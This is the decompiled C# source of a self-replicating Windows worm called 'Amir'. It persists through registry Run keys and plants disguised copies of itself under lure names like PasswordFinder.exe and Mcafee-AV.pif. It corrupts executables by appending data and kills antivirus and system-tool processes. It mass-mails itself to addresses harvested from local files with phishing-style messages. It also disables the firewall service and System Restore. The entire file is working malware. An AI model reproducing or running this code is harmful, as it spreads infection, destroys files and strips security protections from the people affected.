using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Mail;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Amir;

internal class Amir
{
	public void ccopy()
	{
		try
		{
			Directory.CreateDirectory("C:\\Amir30vIL");
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\MDM32.exe");
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\WinKrnl32.cab.exe");
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\Update.exe");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "MDM32.exe", Environment.SystemDirectory + "\\MDM32.exe", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WinKrnl32.cab.exe", Environment.SystemDirectory + "\\WinKrnl32.cab.exe", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Update.exe", Environment.SystemDirectory + "\\Update.exe", RegistryValueKind.String);
		}
		catch (Exception)
		{
		}
	}

	public void DispEXE(string tD)
	{
		try
		{
			string[] directories = Directory.GetDirectories(tD);
			string[] array = new string[36]
			{
				"own", "it", "upl", "syst", "se", "usic", "efu", "am", "caf", "yma",
				"mp3", "wav", "ovi", "roj", "win", "ict", "my", "ina", "Shar", "aza",
				"onk", "mob", "tart", "ffic", "av", "rack", "ile", "W32", "root", "assw",
				"Sounds", "ideo", "rit", "ist", "ys", "orn"
			};
			string[] array2 = directories;
			foreach (string text in array2)
			{
				try
				{
					string[] array3 = array;
					foreach (string pattern in array3)
					{
						try
						{
							if (Regex.IsMatch(text, pattern))
							{
								if (Regex.IsMatch(text, "it"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\NewWeb.exe");
								}
								if (Regex.IsMatch(text, "own"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Downloader.pif");
								}
								if (Regex.IsMatch(text, "upl"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\upload-file.exe");
								}
								if (Regex.IsMatch(text, "syst"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\system.dll.cmd");
								}
								if (Regex.IsMatch(text, "se"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\SexyScreenSaver.scr");
								}
								if (Regex.IsMatch(text, "usic"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\MyMiusic.exe");
								}
								if (Regex.IsMatch(text, "efu"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\defult-path.cmd");
								}
								if (Regex.IsMatch(text, "ame"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\FunGame.flash.exe");
								}
								if (Regex.IsMatch(text, "caf"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Mcafee-AV.pif");
								}
								if (Regex.IsMatch(text, "ort"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\PortScanner.exe");
								}
								if (Regex.IsMatch(text, "yma"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\SymantecUpdate.exe");
								}
								if (Regex.IsMatch(text, "p3"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Mp3Player.pif");
								}
								if (Regex.IsMatch(text, "av"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\WaveToMp32.exe");
								}
								if (Regex.IsMatch(text, "ovi"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Fun.pif");
								}
								if (Regex.IsMatch(text, "win"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\winUpdate.cab.cmd");
								}
								if (Regex.IsMatch(text, "roj"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\install-project.exe");
								}
								if (Regex.IsMatch(text, "ict"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\mypic.scr");
								}
								if (Regex.IsMatch(text, "my"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\myboy.exe");
								}
								if (Regex.IsMatch(text, "ina"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\NewWinamp.exe");
								}
								if (Regex.IsMatch(text, "Shar"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Perl-install.pif");
								}
								if (Regex.IsMatch(text, "aza"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Learning.exe");
								}
								if (Regex.IsMatch(text, "mob"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\mobileAV.exe");
								}
								if (Regex.IsMatch(text, "tart"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\WinUser32.dll.exe");
								}
								if (Regex.IsMatch(text, "ffic"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\newOffice.exe");
								}
								if (Regex.IsMatch(text, "rack"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\TrackPlayer.exe");
								}
								if (Regex.IsMatch(text, "ile"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\readMe.Txt.pif");
								}
								if (Regex.IsMatch(text, "orn"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\pornoPic.scr");
								}
								if (Regex.IsMatch(text, "W32"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\WinLearning.htm.cmd");
								}
								if (Regex.IsMatch(text, "root"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\DefultRoot.pif");
								}
								if (Regex.IsMatch(text, "assw"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\PasswordFinder.exe");
								}
								if (Regex.IsMatch(text, "Sounds"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\NewSound.cmd");
								}
								if (Regex.IsMatch(text, "ideo"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\0110Video.pif");
								}
								if (Regex.IsMatch(text, "rit"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\CDWriter.exe");
								}
								if (Regex.IsMatch(text, "ist"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\NewList.exe");
								}
								if (Regex.IsMatch(text, "ys"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Secure.exe");
								}
							}
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories2 = Directory.GetDirectories(tD);
			string[] array4 = directories2;
			foreach (string tD2 in array4)
			{
				DispEXE(tD2);
			}
		}
		catch (Exception)
		{
		}
	}

	public void happy()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		if (DateTime.Now.Day == 19)
		{
			MessageBox.Show("happy birthday mr.AmIrCiViL", "Amir30vil", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	public void infect(string tf)
	{
		try
		{
			string[] files = Directory.GetFiles(tf, "*.exe");
			string[] array = files;
			foreach (string path in array)
			{
				try
				{
					FileStream output = new FileStream(path, FileMode.Open, FileAccess.Write);
					BinaryWriter binaryWriter = new BinaryWriter(output);
					binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
					for (int j = 0; j < 70; j++)
					{
						binaryWriter.Write("AmIrCiViL");
					}
					binaryWriter.Close();
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(tf);
			string[] array2 = directories;
			foreach (string tf2 in array2)
			{
				infect(tf2);
			}
		}
		catch (Exception)
		{
		}
	}

	public void killer()
	{
		try
		{
			string[] array = new string[424]
			{
				"ACKWIN32", "ADAWARE", "ADVXDWIN", "AGENTSVR", "AGENTW ", "ALERTSVC", "ALEVIR", "ALOGSERV", "AMON9X ", "ANTI-TROJAN",
				"ANTIVIRUS ", "ANTS ", "APIMONITOR", "APLICA32 ", "APVXDWIN ", "ARR ", "ATCON", "ATRO55EN", "ATUPDATER", "ATUPDATER ",
				"ATWATCH ", "AU ", "AUPDATE", "AUPDATE ", "AUTODOWN ", "AUTODOWN", "AUTOTRACE ", "AUTOTRACE ", "AUTOUPDATE ", "AUTOUPDATE ",
				"AVCONSOL ", "AVE32 ", "AVGCC32", "AVGCTRL", "AVGNT ", "AVGSERV", "AVGSERV9", "AVGW ", "AVKPOP", "AVKSERV",
				"AVKSERVICE", "AVKWCTl9 ", "AVLTMAIN ", "AVNT ", "AVP ", "AVP32", "AVPCC ", "AVPDOS32", "AVPM ", "AVPTC32",
				"AVPUPD ", "AVPUPD ", "AVSCHED32", "AVSYNMGR", "AVWINNT ", "AVWUPD ", "AVWUPD32", "AVWUPD32 ", "AVWUPSRV ", "AVXMONITOR9X",
				"AVXMONITORNT ", "AVXQUAR ", "AVXQUAR ", "BACKWEB ", "BARGAINS ", "BD_PROFESSIONAL", "BEAGLE", "BELT ", "BIDEF ", "BIDSERVER",
				"BIPCP", "BIPCPEVALSETUP ", "BISP", "BLACKD", "BLACKICE", "BLSS", "BOOTCONF", "BOOTWARN", "BORG2 ", "BPC ",
				"BRASIL", "BS120", "BUNDLE", "BVT ", "CCAPP", "CCEVTMGR", "CCPXYSVC ", "CDP ", "CFD", "CFGWIZ",
				"CFIADMIN", "CFIAUDIT", "CFINET", "CFINET32", "CLEAN", "CLEANER", "CLEANER3", "CLEANPC ", "CLICK ", "CMD32 ",
				"CMESYS ", "CMGRDIAN", "CMON016 ", "CONNECTIONMONITOR", "CPD ", "CPF9X206", "CPFNT206", "CTRL ", "CV ", "CWNB181",
				"CWNTDWMO ", "IEXPLORER", "IFACE ", "IFW2000", "INETLNFO", "INFUS ", "INFWIN", "INIT ", "INTDEL", "INTREN ",
				"IOMON98", "ISTSVC ", "JAMMER ", "JDBGMRG ", "JEDI ", "KAVLITE40ENG ", "KAVPERS40ENG ", "KAVPF ", "KAZZA", "KEENVALUE",
				"KERIO-PF-213-EN-WIN", "KERIO-WRL-421-EN-WIN", "KERIO-WRP-421-EN-WIN", "KERNEL32", "KILLPROCESSSETUP161", "LAUNCHER", "LDNETMON ", "LDPRO ", "LDPROMENU", "LDSCAN",
				"LNETINFO", "LOADER ", "LOCALNET", "LOCKDOWN", "LOCKDOWN2000", "LOOKOUT ", "LORDPE ", "LSETUP", "LUALL ", "LUAU ",
				"LUCOMSERVER ", "LUINIT ", "LUSPT", "MAPISVC32", "MCAGENT ", "MCMNHDLR ", "MCSHIELD ", "MCTOOL ", "MCUPDATE", "MCUPDATE ",
				"MCVSRTE", "MCVSSHLD ", "MD ", "MFIN32", "MFW2EN ", "MFWENG3.02D30 ", "MGAVRTCL ", "MGAVRTE ", "MGHTML", "MGUI ",
				"MINILOG", "MMOD", "MONITOR", "MOOLIVE", "MOSTAT ", "MPFAGENT ", "MPFSERVICE ", "MPFTRAY ", "MRFLUX", "MSAPP ",
				"MSBB ", "MSBLAST", "MSCACHE ", "MSCCN32 ", "MSCMAN ", "MSCONFIG", "MSDM ", "MSDOS", "MSIEXEC16", "MSINFO32",
				"MSLAUGH ", "MSMGT ", "MSMSGRI32", "MSSMMC32", "MSSYS ", "MSVXD", "MU0311AD", "MWATCH ", "N32SCANW", "NAV ",
				"AUTO-PROTECT.NAV80TRY", "NAVAP.NAVAPSVC", "NAVAPSVC ", "NAVAPW32", "NAVDX ", "NAVLU32", "NAVNT ", "NAVSTUB ", "NAVW32", "NAVWNT",
				"NC2000 ", "NCINST4", "NDD32 ", "NEOMONITOR ", "NEOWATCHLOG ", "NETARMOR ", "NETD32 ", "NETINFO", "NETMON", "NETSCANPRO",
				"NETSPYHUNTER-1.2", "NETSTAT ", "NETUTILS", "NISSERV ", "NISUM ", "NMAIN ", "NOD32 ", "NORMIST", "NORTON_INTERNET_SECU_3.0_407", "NOTSTART",
				"NPF40_TW_98_NT_ME_2K", "NPFMESSENGER ", "NPROTECT", "NPSCHECK", "NPSSVC ", "NSCHED32", "NSSYS32", "NSTASK32", "NSUPDATE", "NT",
				"NTRTSCAN", "NTVDM", "NTXconfig", "NUI", "NUPGRADE", "NUPGRADE", "NVARCH16", "NVC95", "NVSVC32", "NWINST4",
				"NWSERVICE", "NWTOOL16", "OLLYDBG", "ONSRVR", "OPTIMIZE", "OSTRONET", "OTFIX", "OUTPOST", "OUTPOST", "OUTPOSTINSTALL",
				"OUTPOSTPROINSTALL", "PADMIN", "PANIXK", "PATCH", "PAVCL", "PAVPROXY", "PAVSCHED", "PAVW", "PCFWALLICON", "PCIP10117_0",
				"PCSCAN", "PDSETUP", "PERISCOPE", "PERSFW", "PERSWF", "PF2", "PFWADMIN", "PGMONITR", "PINGSCAN", "PLATIN",
				"POP3TRAP", "POPROXY", "POPSCAN", "PORTDETECTIVE", "PORTMONITOR", "POWERSCAN", "PPINUPDT", "PPTBC", "PPVSTOP", "PRIZESURFER",
				"PRMT", "PRMVR", "PROCDUMP", "PROCESSMONITOR", "PROCEXPLORERV1.0", "PROGRAMAUDITOR", "PROPORT", "PROTECTX ", "PSPF", "PURGE",
				"QCONSOLE", "QSERVER", "RAPAPP", "RAV7", "RAV7WIN", "RAV8WIN32ENG", "RAY", "RB32", "RCSYNC", "REALMON",
				"REGED", "REGEDIT", "REGEDT32", "RESCUE", "RESCUE32", "RRGUARD", "RSHELL", "RTVSCAN", "RTVSCN95", "RULAUNCH",
				"RUN32DLL", "RUNDLL", "RUNDLL16", "RUXDLL32", "SAFEWEB", "SAHAGENT ", "SAVE", "SAVENOW", "SBSERV", "SC",
				"SCAM32", "SCAN32", "SCAN95", "SCANPM", "SCRSCAN", "SETUPVAMEEVAL", "SETUP_FLOWPROTECTOR_US", "SFC", "SGSSFW32", "SH",
				"SHELLSPYINSTALL", "SHN", "SHOWBEHIND", "SMC", "SMS", "SMSS32", "SOAP", "SOFI", "SPERM", "SPF",
				"SPHINX", "SPOLER", "SPOOLCV", "SPOOLSV32", "SPYXX", "SREXE", "SRNG", "SS3EDIT", "SSGRATE", "SSG_4104",
				"ST2", "START", "STCLOADER", "SUPFTRL", "SUPPORT", "SUPPORTER5", "SVC", "SVCHOSTC", "SVCHOSTS", "SVSHOST",
				"SWEEP95 ", "SWEEPNET.SWEEPSRV.SYS.SWNETSUP", "SYMPROXYSVC", "SYMTRAY", "SYSEDIT ", "SYSTEM", "SYSTEM32", "SYSUPD", "TASKMG", "TASKMO",
				"TASKMON", "TAUMON", "TBSCAN", "TC", "TCA", "TCM", "TDS-3", "TDS2-NT", "TEEKIDS", "TFAK",
				"TFAK5", "TGBOB", "TITANIN", "TITANINXP", "TRACERT", "TRICKLER", "TRJSCAN", "TRJSETUP", "TROJANTRAP3", "TSADBOT",
				"TVMD", "TVTMD", "UNDOBOOT", "UPDAT", "UPDATE", "UPDATE", "UPGRAD", "UTPOST", "VBCMSERV", "VBCONS",
				"VBUST ", "VBWIN9X", "VBWINNTW", "VCSETUP", "VET32 ", "VET95", "vb6", "taskmgr", "regedit", "notepad",
				"install", "setup", "MpfConsole", "AmIrCiViL"
			};
			string[] array2 = array;
			foreach (string processName in array2)
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName(processName);
					Process[] array3 = processesByName;
					foreach (Process process in array3)
					{
						process.CloseMainWindow();
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void massmail(string td)
	{
		//IL_03ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Expected O, but got Unknown
		//IL_0469: Unknown result type (might be due to invalid IL or missing references)
		//IL_0473: Expected O, but got Unknown
		try
		{
			try
			{
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\mail.pif");
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\YourPassword.html.pif");
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\ScreenSaver.scr");
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\Winamp2006.exe");
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\NewEmule.exe");
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\DotNetFrameWork.exe");
			}
			catch (Exception)
			{
			}
			string[] array = new string[6] { "mail.pif", "YourPassword.html.pif", "ScreenSaver.scr", "Winamp2006.ex", "NewEmule.exe", "DotNetFrameWork.exe" };
			int num = new Random().Next(0, 6);
			string text = array[num];
			string[] array2 = new string[6] { "Delivery Failure", "Deliver Mail", "Failed", "Mail System", "Status", "Unknown Exception" };
			int num2 = new Random().Next(0, 6);
			string subject = array2[num2];
			string[] array3 = new string[13]
			{
				"Thank you for using file", "+++ Attachment: No Virus (Clean)", "It has come to our attention that your (File!) User Profile ( x )records are out of date. For further details see the attached document.Tank you for using !", "+++ report file", "Your e-mail account was used to send a huge amount of unsolicited spam messages during the recent week. If you could please take 5-10 minutes out of your online experience and confirm the attached document so you will not run into any future problems with the online service.", "Deliver Error", "Message Error", "help attached", "such as yours", "illegal st. of you?",
				"I have your password! ", "classroom test of you?", "old screen about you?"
			};
			int num3 = new Random().Next(0, 13);
			string body = array3[num3];
			string[] array4 = new string[20]
			{
				"mcafee@yahoo.com", "symantec@yahoo.com", "nod32@yahoo.com", "panda@yahoo.com", "avg@yahoo.com", "emule@yahoo.com", "info@yahoo.com", "ebook@yahoo.com", "LongShot@yahoo.com", "winamp@yahoo.com",
				"update@yahoo.com", "matt@yahoo.com", "steve@yahoo.com", "smith@yahoo.com", "stan@yahoo.com", "bill@yahoo.com", "bob@yahoo.com", "YourFriend@yahoo.com", " mail@yahoo.com", "ted@yahoo.com"
			};
			int num4 = new Random().Next(0, 20);
			string from = array4[num4];
			string[] array5 = new string[13]
			{
				"*htm", "*txt", "*xml", "*adb", "*asp", "*cfg", "*cgi", "*dbx", "*eml", "*pl",
				"*shtm", "*wab", "*vbs"
			};
			try
			{
				string[] array6 = array5;
				foreach (string searchPattern in array6)
				{
					string[] files = Directory.GetFiles(td, searchPattern);
					string[] array7 = files;
					foreach (string path in array7)
					{
						Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[com]+");
						FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
						byte[] array8 = new byte[fileStream.Length];
						fileStream.Read(array8, 0, (int)fileStream.Length);
						fileStream.Close();
						foreach (Match item in regex.Matches(Encoding.ASCII.GetString(array8)))
						{
							string text2 = item.ToString();
							try
							{
								MailMessage val = new MailMessage();
								val.set_From(from);
								val.set_To(text2);
								val.set_Cc("info@yahoo.com");
								val.set_Bcc("AV@yahoo.com");
								val.set_Subject(subject);
								val.set_Body(body);
								if (Regex.IsMatch(text2, "@yahoo.com"))
								{
									SmtpMail.set_SmtpServer("mx1.mail.yahoo.com");
								}
								if (Regex.IsMatch(text2, "@hotmail.com"))
								{
									SmtpMail.set_SmtpServer("mx1.hotmail.com");
								}
								val.get_Attachments().Add((object?)new MailAttachment(text, (MailEncoding)1));
								SmtpMail.Send(val);
							}
							catch (Exception)
							{
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(td);
			string[] array9 = directories;
			foreach (string td2 in array9)
			{
				massmail(td2);
			}
		}
		catch (Exception)
		{
		}
	}

	public void regist2()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] array = new string[26]
		{
			"Taskmon", "Explorer", "Windows Services Host", "KasperskyAV", " d3dupdate.exe", "au.exe", "OLE", "winupd.exe", "direct.exe ", "jijbl ",
			"Video ", "service", "DELETE ME", "d3dupdate.exe", "Sentry", "gouday.exe", "rate.exe", "Windows Services Host", "sysmon.exe ", "srate.exe",
			"ssate.exe ", "Microsoft IE Execute shell", "Winsock2 driver", "ICM version", "yeahdude.exe ", "Microsoft System Checkup"
		};
		string[] array2 = array;
		foreach (string name in array2)
		{
			try
			{
				registryKey.DeleteValue(name);
			}
			catch (Exception)
			{
			}
		}
	}

	public void regist3()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] array = new string[35]
		{
			"MCAgentExe", "MCUpdateExe", "WinampAgent", "OASClnt", "Taskmon", "Explorer", "Windows Services Host", "KasperskyAV", "System", "msgsvr32",
			"service", "Sentry", "Explorer", "system", "msgsvr32", "au.exe", "winupd.exe", "direct.exe ", "jijbl ", "Video ",
			"service", "DELETE ME", "d3dupdate.exe", "Sentry", "gouday.exe", "rate.exe", "Windows Services Host", "sysmon.exe ", "srate.exe", "ssate.exe ",
			"Microsoft IE Execute shell", "Winsock2 driver", "ICM version", "yeahdude.exe ", "Microsoft System Checkup"
		};
		string[] array2 = array;
		foreach (string name in array2)
		{
			try
			{
				registryKey.DeleteValue(name);
			}
			catch (Exception)
			{
			}
		}
	}

	public void setreg()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess", "Start", "4", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	public void setreg7()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\\\ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile", "EnableFirewal", "1", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	public void setreg8()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\OLE", "EnableDCOM", "N", RegistryValueKind.String);
		}
		catch (Exception)
		{
		}
	}

	public void setreg9()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore", "DisableSR", "1", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}
}
